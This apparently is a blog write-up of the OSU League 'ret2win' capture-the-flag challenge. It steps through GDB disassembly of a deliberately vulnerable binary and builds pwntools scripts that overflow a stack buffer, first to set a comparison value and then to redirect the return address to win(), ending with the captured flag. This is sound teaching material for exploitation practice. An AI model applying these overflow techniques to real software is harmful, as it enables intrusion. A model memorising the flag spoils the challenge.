---
title: "OSU League 2020/2021 - ret2win Writeup"
date: 2020-11-07
draft: false
description: ""
tags: ["ctf"]
---
## Writeup
The goal of this challenge is to redirect code flow to the `win()` function.  Opening up the binary in GDB, we can see some other interesting functions that we have.
```
0x0000000000400607  win
0x0000000000400652  part2
0x0000000000400699  part1
0x00000000004006ee  main
```

Let's disassemble them and see what's going on:

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x00000000004006ee <+0>:	push   rbp
   0x00000000004006ef <+1>:	mov    rbp,rsp
   0x00000000004006f2 <+4>:	mov    eax,0x0
   0x00000000004006f7 <+9>:	call   0x400699 <part1>
   0x00000000004006fc <+14>:	mov    eax,0x0
   0x0000000000400701 <+19>:	pop    rbp
   0x0000000000400702 <+20>:	ret
End of assembler dump.
gdb-peda$ disass part1
Dump of assembler code for function part1:
   0x0000000000400699 <+0>:	push   rbp
   0x000000000040069a <+1>:	mov    rbp,rsp
   0x000000000040069d <+4>:	sub    rsp,0x20
   0x00000000004006a1 <+8>:	mov    QWORD PTR [rbp-0xc],0x0
   0x00000000004006a9 <+16>:	lea    rdi,[rip+0x1a0]        # 0x400850
   0x00000000004006b0 <+23>:	call   0x4004e0 <puts@plt>
   0x00000000004006b5 <+28>:	mov    rdx,QWORD PTR [rip+0x200994]        # 0x601050 <stdin@@GLIBC_2.2.5>
   0x00000000004006bc <+35>:	lea    rax,[rbp-0x20]
   0x00000000004006c0 <+39>:	mov    esi,0x20
   0x00000000004006c5 <+44>:	mov    rdi,rax
   0x00000000004006c8 <+47>:	call   0x400500 <fgets@plt>
   0x00000000004006cd <+52>:	mov    rdx,QWORD PTR [rbp-0xc]
   0x00000000004006d1 <+56>:	movabs rax,0xbaddecafbeefcafe
   0x00000000004006db <+66>:	cmp    rdx,rax
   0x00000000004006de <+69>:	jne    0x4006eb <part1+82>
   0x00000000004006e0 <+71>:	mov    eax,0x0
   0x00000000004006e5 <+76>:	call   0x400652 <part2>
   0x00000000004006ea <+81>:	nop
   0x00000000004006eb <+82>:	nop
   0x00000000004006ec <+83>:	leave
   0x00000000004006ed <+84>:	ret
End of assembler dump.
```

So all `main` does it seems is to just call `part1()`.  And in that function it compares some value on the stack to the value `0xbaddecafbeefcafe`, and jumps to `part2()` if they are equal.  We can see the value is located at `$rbp-0xc`, and that the max buffer size is `0x20` bytes. So all we need to do is input `0x20 - 0x0c = 0x14` bytes, or 20 bytes, followed by `0xbaddecafbeefcafe`.

```python
from pwn import *

io = process("./ret2win")

io.recvuntil("overwrite data")
payload_1 = b"A" * 20
payload_1 += p64(0xbaddecafbeefcafe)

io.sendline(payload_1)

io.interactive()
```

And running it we are able to call `part2()`!

```
[+] Starting local process './ret2win': pid 2557
[*] Switching to interactive mode

Well done!
That was the same vuln as last week though, we probably shouldn't give you a flag for that
Reply "yes" to awknowledge that you don't deserve any points
$ no
[*] Got EOF while reading in interactive
```

Let's now take a look at the disassembly of `part2()`:


```
gdb-peda$ disass part2
Dump of assembler code for function part2:
   0x0000000000400652 <+0>:	push   rbp
   0x0000000000400653 <+1>:	mov    rbp,rsp
   0x0000000000400656 <+4>:	sub    rsp,0x20
   0x000000000040065a <+8>:	lea    rdi,[rip+0x13e]        # 0x40079f
   0x0000000000400661 <+15>:	call   0x4004e0 <puts@plt>
   0x0000000000400666 <+20>:	lea    rdi,[rip+0x143]        # 0x4007b0
   0x000000000040066d <+27>:	call   0x4004e0 <puts@plt>
   0x0000000000400672 <+32>:	lea    rdi,[rip+0x197]        # 0x400810
   0x0000000000400679 <+39>:	call   0x4004e0 <puts@plt>
   0x000000000040067e <+44>:	mov    rdx,QWORD PTR [rip+0x2009cb]        # 0x601050 <stdin@@GLIBC_2.2.5>
   0x0000000000400685 <+51>:	lea    rax,[rbp-0x20]
   0x0000000000400689 <+55>:	mov    esi,0x64
   0x000000000040068e <+60>:	mov    rdi,rax
   0x0000000000400691 <+63>:	call   0x400500 <fgets@plt>
   0x0000000000400696 <+68>:	nop
   0x0000000000400697 <+69>:	leave
   0x0000000000400698 <+70>:	ret
End of assembler dump.
gdb-peda$ break *0x0000000000400691
Breakpoint 1 at 0x400691
gdb-peda$ r < part1
```
I set a break point at the end so I can take a look at the stack frame.  `part1` is just a text file with the payload already in it.

```
gdb-peda$ info frame
Stack level 0, frame at 0x7fffffffdec0:
 rip = 0x400691 in part2; saved rip = 0x4006ea
 called by frame at 0x7fffffffdef0
 Arglist at 0x7fffffffdeb0, args:
 Locals at 0x7fffffffdeb0, Previous frame's sp is 0x7fffffffdec0
 Saved registers:
  rbp at 0x7fffffffdeb0, rip at 0x7fffffffdeb8
gdb-peda$ p 0xdeb8 - (0xdeb0 - 0x20)
$4 = 0x28
```

So now with this, we know the start of the buffer is at `$rbp - 0x20`. Subract that from `$rip` and we get how many bytes we need to fill before we overwrite the instruction pointer.

But what should we overwrite it with?  Well, we can give any address we want and it will jump to it!  So let's give it the address of the `win()` function. Recall that:

```
0x0000000000400607  win
```

So now we can build our final exploit:

```python
from pwn import *

#io = process("./ret2win")
io = remote('ctf.ropcity.com', 31337)

io.recvuntil("overwrite data")
payload_1 = b"A" * 20
payload_1 += p64(0xbaddecafbeefcafe)

f = open("part1", "wb")
f.write(payload_1)
f.close()

io.sendline(payload_1)
io.recvuntil("any points")

payload_2 = b"A" * 40
payload_2 += p64(0x0000000000400607)

io.sendline(payload_2)

io.interactive()
```

And running it we get the flag!

```
[+] Starting local process './ret2win': pid 115498
Reply "yes" if you remember how to overwrite data

[*] Switching to interactive mode
Well done!
That was the same vuln as last week though, we probably shouldn't give you a flag for that
Reply "yes" to awknowledge that you don't deserve any points
osu{$oRRY_y0U_d0_de$Erv3_7his}
```
